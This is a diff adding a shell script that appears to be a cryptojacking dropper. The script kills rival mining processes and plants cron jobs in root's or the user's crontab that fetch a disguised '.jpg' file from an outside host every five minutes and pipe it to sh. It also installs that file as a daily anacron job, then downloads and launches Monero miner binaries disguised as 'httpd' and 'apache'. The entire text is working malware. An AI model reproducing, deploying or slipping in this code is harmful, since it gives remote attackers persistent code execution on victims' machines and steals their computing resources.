@@ -1,0 +1,32 @@
+#!/bin/sh
+export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+plt=`cat /proc/cpuinfo|grep aes`
+ps x|grep stratum|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
+if [ `whoami` = "root" ]; then
+    echo "*/5 * * * * curl -fsSL http://www.china-angu.com/picture/lssh.jpg  | sh" > /var/spool/cron/root
+    mkdir -p /var/spool/cron/crontabs
+    echo "*/5 * * * * curl -fsSL http://www.china-angu.com/picture/lssh.jpg  | sh" > /var/spool/cron/crontabs/root
+curl -O http://www.china-angu.com/picture/lssh.jpg  > /dev/null 2>&1; mv lssh.jpg /etc/cron.daily/anacron ; chmod +x /etc/cron.daily/anacron||wget -O /etc/cron.daily/anacron http://www.china-angu.com/picture/lssh.jpg > /dev/null 2>&1 ; chmod +x /etc/cron.daily/anacron
+else
+    echo "*/5 * * * * curl -fsSL http://www.china-angu.com/picture/lssh.jpg | sh" |crontab -	
+fi
+DoYam()
+{
+	if [ ! -f "/var/tmp/xmr.tar.gz" ]; then
+curl -fsSL  http://www.china-angu.com/picture/xmr.tar.gz -o /var/tmp/xmr.tar.gz || wget  http://www.china-angu.com/picture/xmr.tar.gz -O /var/tmp/xmr.tar.gz
+    fi
+	tar zxf /var/tmp/xmr.tar.gz -C /var/tmp/	
+    chmod +x /var/tmp/xmr/*
+	export LD_LIBRARY_PATH=/var/tmp/xmr
+	cd /var/tmp/xmr
+	if [ "$plt" != "" ]
+     then 
+     (exec ./httpd -c httpd.cnf &> /dev/null &)
+     else
+	 #no aes 
+	 (exec ./apache -c httpd.cnf &> /dev/null &)
+    echo no
+    fi
+}
+#ps auxf|grep -v grep|grep "httpd.conf" || DoYam
+ps x |grep httpd.cnf|grep -v grep || DoYam
